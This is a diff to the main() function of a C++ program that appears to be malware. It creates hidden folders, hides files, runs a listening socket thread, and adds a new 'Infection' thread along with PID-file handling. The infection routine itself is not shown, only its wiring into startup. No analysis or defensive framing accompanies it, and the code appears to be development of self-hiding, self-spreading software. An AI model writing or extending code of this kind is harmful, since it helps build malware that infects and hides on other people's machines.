@@ -3,15 +3,15 @@
 #include "InitControl.h"
 #include "ThreadStart.h"
 #include "ThreadSocket.h"
+#include "ThreadInfection.h"
 #include "Singlemodulesrun.h"
 #include "ControlCopy.h"
 
 void main(void)
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	control *B = new control, C, X;
 	ofstream out;
-	pthread_t ModuleStarter, ListenSocket;
+	pthread_t ModuleStarter, ListenSocket, Infection;
 
 	CreateHiddenFolders();
 	HideFile(library);
@@ -20,6 +20,10 @@ void main(void)
 
 	InitControl(C);
 	Copy(X, C);
+
+	out.open("PID", ios::out); out << GetCurrentProcessId(); out.close(); out.clear();
+
+	pthread_create(&Infection, NULL, InfectionProc, NULL);
 
 	OutTextWithTime(logpath, "[Begin]   Threads were started in ", &C, out);
 
@@ -53,4 +57,5 @@ void main(void)
 	} while (C.stop == true);
 
 	OutTextWithTime(logpath, "[Stop]    Threads were stopped in ", NULL, out);
+	DeleteFile("PID");
 }
